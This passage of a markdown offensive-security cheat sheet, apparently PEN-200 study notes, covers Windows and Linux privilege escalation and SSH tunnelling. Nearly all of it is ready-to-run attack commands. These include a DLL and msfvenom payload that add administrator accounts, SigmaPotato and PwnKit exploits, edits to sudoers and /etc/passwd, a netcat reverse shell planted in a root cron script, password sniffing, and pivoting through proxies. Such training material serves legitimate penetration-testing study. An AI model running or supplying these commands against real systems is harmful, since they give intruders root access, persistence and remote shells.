  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
~~~


#### Cross-Compile the C++ Code to a 64-bit DLL

~~~ bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
~~~


#### Download compiled DLL

~~~ powershell
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
~~~


### Unquoted Service Paths
---

#### List of services with spaces and missing quotes in the binary path

~~~ powershell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
~~~

~~~ powershell
Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
~~~

#### Create exe-service
~~~ bash
msfvenom -p windows/x64/exec CMD="net user redteam password123! /add && net localgroup Administrators redteam /add" -f exe-service -o Abyss.exe
~~~


#### Restart service

~~~ powershell
Restart-Service AbyssWebServer
~~~


## Abusing Other Windows Components

### Scheduled Tasks

#### Display a list of all scheduled tasks

~~~ powershell
schtasks /query /fo LIST /v | findstr C:\Users
~~~




### Using Exploits

#### Enumerating the Windows version and security patches

~~~ powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
~~~


#### checking our current privileges

~~~ powershell
whoami /priv
~~~


#### Elevating our privileges to SYSTEM([CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release))

~~~ powershell
.\CVE-2023-29360.exe
~~~


#### Downloading SigmaPotato.exe

~~~ powershell
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
~~~

#### Using the SigmaPotato tool to get add a new user to the Administrators localgroup

~~~ powershell
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
~~~


# Linux Privilege Escalation

## Enumerating Linux

### Manual Enumeration


#### Getting the version of the running operating system and architecture

~~~ bash
cat /etc/issue
cat /etc/os-release
uname -a
~~~


#### Listing all cron jobs

~~~ bash
ls -lah /etc/cron*
~~~


#### Listing cron jobs for the current user

~~~ bash
crontab -l
~~~


#### Listing cron jobs for the root user

~~~ bash
sudo crontab -l
~~~


#### Listing all world writable directories

~~~ bash
find / -writable -type d 2>/dev/null
~~~


#### Searching for SUID files

~~~ bash
find / -perm -u=s -type f 2>/dev/null
~~~

#### list of Linux privilege escalation techniques:

- [compendium](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation) by g0tmi1k
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)



### Automated Enumeration


#### Running unix_privesc_check

~~~ bash
./unix-privesc-check standard > output.txt
~~~


## Exposed Confidential Information

### Inspecting User Trails

#### Inspecting Environment Variables

~~~ bash
env
~~~


#### Inspecting .bashrc

~~~ bash
cat .bashrc
~~~


#### Inspecting sudo capabilities

~~~ bash
sudo -l
~~~

#### Add user to sudoers List

~~~ bash
echo 'kali ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
~~~~

#### SetUID to /bin/bash

~~~ bash
chmod u+s /bin/bash
~~~


### Inspecting Service Footprints

#### Harvesting Active Processes for Credentials

~~~ bash
watch -n 1 "ps -aux | grep pass"
~~~

#### Using tcpdump to Perform Password Sniffing

~~~ bash
sudo tcpdump -i lo -A | grep "pass"
~~~


## Insecure File Permissions

### Abusing Cron Jobs

#### Inspecting the cron log file

~~~ bash
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
~~~



#### Inserting a reverse shell one-liner in user_backups.sh

~~~ bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
~~~


### Abusing Password Authentication


#### Escalating privileges by editing /etc/passwd

~~~ bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
~~~


## Insecure System Components

### Abusing Setuid Binaries and Capabilities


#### Manually Enumerating Capabilities

~~~ bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
~~~


#### GTFOBins (list of Unix binaries for post-exploitation): 
[https://gtfobins.github.io/](https://gtfobins.github.io/)




### Abusing Sudo

#### Inspecting current user's sudo permissions

~~~ bash
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
~~~


### Exploiting Kernel Vulnerabilities

#### Gathering general information on the target system

~~~ bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
~~~


#### Gathering kernel and architecture information from our Linux target

~~~ bash
joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64
~~~


#### Using searchsploit to find privilege escalation exploits for our target

~~~ bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
~~~


#### PwnKit.sh

~~~ bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
~~~


# Port Redirection and SSH Tunneling

## Port Forwarding with Linux Tools

### Port Forwarding with Socat

~~~ bash
# socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST:RPORT>
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
~~~



## SSH Tunneling

### SSH Local Port Forwarding

#### Running the local port forward command

~~~ bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
~~~

#### Resources

- [ssh_local_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/1e4c3abaa24721e69c1359811673c91f-ssh_local_client)
- [ssh_local_client_aarch64](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/3517f72efa170f849974e84a250497d6-ssh_local_client_aarch64)



### SSH Dynamic Port Forwarding

#### Opening the SSH dynamic port forward on port 9999

~~~ bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
~~~


#### The Proxychains configuration file, pointing towards the SOCKS proxy set up

~~~ bash
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
~~~

#### connection through the SOCKS proxy using Proxychains

~~~ bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
~~~


#### Resources

- [ssh_dynamic_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client)
- [ssh_dynamic_client_aarch64](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/23988ed48288d3a3f8118fe1e6495483-ssh_dynamic_client_aarch64)




### SSH Remote Port Forwarding

#### The SSH remote port forward being set up, connecting to the Kali machine

~~~ bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
~~~

#### Check bounding ports

~~~ bash
ss -ntplu
~~~

#### Resources

- [ssh_remote_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/2e345e06246bd4465204327a6d6892a5-ssh_remote_client)
- [ssh_remote_client_aarch64](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/dfdadb5afb5a697c6cf8fd8568835443-ssh_remote_client_aarch64)


### SSH Remote Dynamic Port Forwarding

#### Making the SSH connection with the remote dynamic port forwarding option

~~~ bash
ssh -N -R 9998 kali@192.168.118.4
~~~

#### Editing the Proxychains configuration file to point to the new SOCKS proxy on port 9998

~~~ bash
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
~~~


#### Resources

- [ssh_remote_dynamic_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client)
- [ssh_remote_dynamic_client_aarch64](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/0bf514c2878bd2de5beff60f580fdf0c-ssh_remote_dynamic_client_aarch64)




